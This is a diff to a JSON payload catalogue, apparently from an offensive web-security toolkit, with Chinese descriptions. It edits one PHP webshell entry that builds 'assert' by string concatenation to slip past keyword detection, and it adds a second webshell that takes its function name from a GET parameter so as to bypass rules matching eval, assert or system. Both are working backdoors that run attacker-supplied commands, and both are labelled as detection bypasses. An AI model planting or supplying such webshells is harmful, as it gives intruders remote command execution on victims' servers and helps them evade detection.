@@ -33,10 +33,22 @@
       "title": "禁用函数替代写法",
       "category": "PHP",
       "code": "<?php $f='as'.'sert';$f($_POST['cmd']); ?>",
-      "desc": "通过字符串拼接规避部分检测，需确认 assert 是否可用。",
+      "desc": "通过字符串拼接规避关键字检测。assert 仅在 PHP 5 下能执行字符串参数；PHP 7 起不再对字符串求值，也不能再作为可变函数调用，该写法在 PHP 7+ 失效。",
       "tags": ["webshell", "php", "bypass"],
       "vars": [],
       "file": "shell-bypass.php",
+      "risk": "danger",
+      "source": "公开免杀研究"
+    },
+    {
+      "id": "webshell-php-dynamic",
+      "title": "动态函数调用马",
+      "category": "PHP",
+      "code": "<?php $f=$_GET['f'];$f($_POST['cmd']); ?>",
+      "desc": "函数名由参数传入，可绕过只匹配 eval/assert/system 等固定函数名的规则；需目标未禁用相关函数。",
+      "tags": ["webshell", "php", "bypass"],
+      "vars": [],
+      "file": "shell-dynamic.php",
       "risk": "danger",
       "source": "公开免杀研究"
     },
